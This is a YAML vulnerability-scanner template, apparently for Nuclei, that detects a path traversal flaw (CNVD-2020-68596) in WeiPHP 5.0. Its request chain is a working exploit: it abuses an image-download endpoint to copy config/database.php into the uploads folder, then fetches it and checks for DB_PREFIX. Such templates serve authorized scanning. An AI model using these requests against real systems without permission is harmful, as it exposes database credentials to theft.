id: CNVD-2020-68596
info:
  name: WeiPHP 5.0 - Path Traversal
  author: pikpikcu
  description: WeiPHP 5.0 can be compromised using directory traversal attacks, as
    identified by the vulnerability code CNVD-2020-68596.
  severity: high
  reference:
  - http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  tags: weiphp,lfi,cnvd,cnvd2020
  metadata:
    impact: The impact of CNVD-2020-68596 is that WeiPHP 5.0 is at risk of allowing
      unauthorized access to sensitive files through path traversal attacks.
    recommendation: It is recommended to update WeiPHP to a version that addresses
      the vulnerability to prevent potential path traversal attacks.
requests:
- raw:
  - 'POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    "1":1

    '
  - 'GET /public/index.php/home/file/user_pics HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET {{endpoint}} HTTP/1.1

    Host: {{Hostname}}

    '
  extractors:
  - type: regex
    name: endpoint
    part: body
    internal: true
    regex:
    - /public/uploads/picture/(.*.jpg)
  matchers:
  - type: word
    part: body
    words:
    - https://weiphp.cn
    - WeiPHP
    - DB_PREFIX
    condition: and
